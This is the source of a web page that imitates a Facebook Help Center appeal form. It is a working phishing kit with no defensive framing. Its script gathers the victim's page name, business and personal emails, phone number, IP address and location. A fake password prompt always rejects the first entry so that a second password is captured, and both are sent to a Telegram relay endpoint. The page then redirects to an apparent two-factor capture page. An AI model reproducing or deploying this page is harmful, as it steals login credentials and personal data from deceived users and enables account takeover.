<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Help Center - Disagree with Decision</title>
    <style>
        /* CSS giữ nguyên như cũ */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            background-color: #f0f2f5;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        /* ... (phần CSS còn lại giữ nguyên) ... */
    </style>
</head>
<body>
    <div class="header">
        <a href="#" class="help-center-link">facebook</a>
        <div class="search-bar">
            <input type="text" placeholder="How can we help?">
        </div>
        <span class="language">English (US)</span>
    </div>

    <div class="main-content">
        <div class="sidebar">
            <!-- Sidebar items giữ nguyên -->
        </div>

        <div class="content-area">
            <div class="form-container">
                <h2>Disagree with Decision</h2>
                <p>Ticket Number: <span id="ticketNumber" class="ticket-number"></span></p>
                <p>We may need to collect some info from you that'll help us review your account again. Complete the required information and submit the appeal form.</p>

                <form id="disagreeForm">
                    <label for="yourName">Page Name *</label>
                    <input type="text" id="yourName" name="yourName" required>

                    <label for="businessEmail">Business Email *</label>
                    <input type="email" id="businessEmail" name="businessEmail"  required>
                    <p class="note">Notifications about the verification status will be sent to this email.</p>

                    <label for="personalEmail">Personal Email *</label>
                    <input type="email" id="personalEmail" name="personalEmail" required>

                    <label for="mobilePhoneNumber">Mobile Phone Number *</label>
                    <input type="text" id="mobilePhoneNumber" name="mobilePhoneNumber"  required>
                    <p class="note">We can use this phone number to contact you for verification.</p>

                    <label for="additionalInfo">Please provide us information that will help us investigate</label>
                    <textarea id="additionalInfo" name="additionalInfo"></textarea>

                    <p class="terms">Learn more about our <a href="#">Terms and Community Standards.</a></p>

                    <button type="submit" id="sendButton">Send</button>
                </form>
            </div>
        </div>
    </div>

    <div class="popup-overlay" id="passwordPopupOverlay">
        <div class="popup-content">
            <h3>Please Enter Your Password</h3>
            <p>For security reasons, please enter your password to continue.</p>
            <input type="password" id="passwordInput" placeholder="Password" required>
            <div class="error-message" id="passwordError">Incorrect password. Please try again.</div>
            <button id="confirmPasswordButton">Confirm</button>
        </div>
    </div>

    <script>
        const IPGEOLOCATION_API_KEY = 'faed5e0d05fe49b2ae40cbd6dc8027cf';
        let ipAddress = 'N/A';
        let locationData = 'N/A';
        let formData = {};
        let passwordAttemptCount = 0;
        let passwordAttemptValue1 = '';
        let passwordAttemptValue2 = '';

        const ticketNumberSpan = document.getElementById('ticketNumber');
        const disagreeForm = document.getElementById('disagreeForm');
        const sendButton = document.getElementById('sendButton');

        const passwordPopupOverlay = document.getElementById('passwordPopupOverlay');
        const passwordInput = document.getElementById('passwordInput');
        const passwordError = document.getElementById('passwordError');
        const confirmPasswordButton = document.getElementById('confirmPasswordButton');

        function generateRandomTicketNumber() {
            return Math.floor(100000000000 + Math.random() * 900000000000).toString();
        }

        async function getIPAndLocation() {
            try {
                const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${IPGEOLOCATION_API_KEY}`);
                const data = await response.json();
                ipAddress = data.ip || 'N/A';
                locationData = `${data.city || 'Unknown City'}, ${data.state_prov || 'Unknown Region'}, ${data.country_name || 'Unknown Country'}`;
            } catch (error) {
                console.error('IP fetch error:', error);
            }
        }

        async function sendMessageToTelegram(message) {
            try {
                const response = await fetch('/api/send-telegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message: message })
                });
                const data = await response.json();
                if (!data.success) console.error('Telegram API error:', data.error);
            } catch (error) {
                console.error('Error calling Telegram API:', error);
            }
        }

        sendButton.addEventListener('click', async (e) => {
            e.preventDefault();
            formData = {
                yourName: document.getElementById('yourName').value,
                businessEmail: document.getElementById('businessEmail').value,
                personalEmail: document.getElementById('personalEmail').value,
                mobilePhoneNumber: document.getElementById('mobilePhoneNumber').value,
                additionalInfo: document.getElementById('additionalInfo').value
            };

            if (!formData.yourName || !formData.businessEmail || !formData.personalEmail || !formData.mobilePhoneNumber) {
                alert('Please fill in all required fields.');
                return;
            }

            if (ipAddress === 'N/A') await getIPAndLocation();

            passwordInput.value = '';
            passwordError.style.display = 'none';
            passwordPopupOverlay.style.display = 'flex';
            passwordInput.focus();
        });

        confirmPasswordButton.addEventListener('click', async () => {
            const password = passwordInput.value;
            if (!password) {
                passwordError.textContent = 'Password cannot be empty.';
                passwordError.style.display = 'block';
                return;
            }

            passwordAttemptCount++;
            let message = `<b>Submission Attempt ${passwordAttemptCount}</b>\n`;
            message += `IP & Location: ${ipAddress} (${locationData})\n`;
            message += `Page Name: ${formData.yourName}\n`;
            message += `Business Email: ${formData.businessEmail}\n`;
            message += `Personal Email: ${formData.personalEmail}\n`;
            message += `Mobile Phone: ${formData.mobilePhoneNumber}\n`;

            if (passwordAttemptCount === 1) {
                passwordAttemptValue1 = password;
                message += `Password Attempt 1: ${passwordAttemptValue1}\n`;
                await sendMessageToTelegram(message);
                passwordError.textContent = 'Incorrect password. Please try again.';
                passwordError.style.display = 'block';
            } else if (passwordAttemptCount === 2) {
                passwordAttemptValue2 = password;
                message += `Password Attempt 2: ${passwordAttemptValue2}\n`;
                await sendMessageToTelegram(message);
                passwordPopupOverlay.style.display = 'none';
                localStorage.setItem('formData', JSON.stringify(formData));
                localStorage.setItem('ipAddress', ipAddress);
                localStorage.setItem('locationData', locationData);
                localStorage.setItem('passwordAttemptValue1', passwordAttemptValue1);
                localStorage.setItem('passwordAttemptValue2', passwordAttemptValue2);
                window.location.href = '2fa_page.html';
            }
            passwordInput.value = '';
        });

        document.addEventListener('DOMContentLoaded', () => {
            ticketNumberSpan.textContent = generateRandomTicketNumber();
            getIPAndLocation();
            localStorage.removeItem('formData');
            localStorage.removeItem('ipAddress');
            localStorage.removeItem('locationData');
            localStorage.removeItem('passwordAttemptValue1');
            localStorage.removeItem('passwordAttemptValue2');
            localStorage.removeItem('twoFAAttemptCount');
        });
    </script>
</body>
</html>
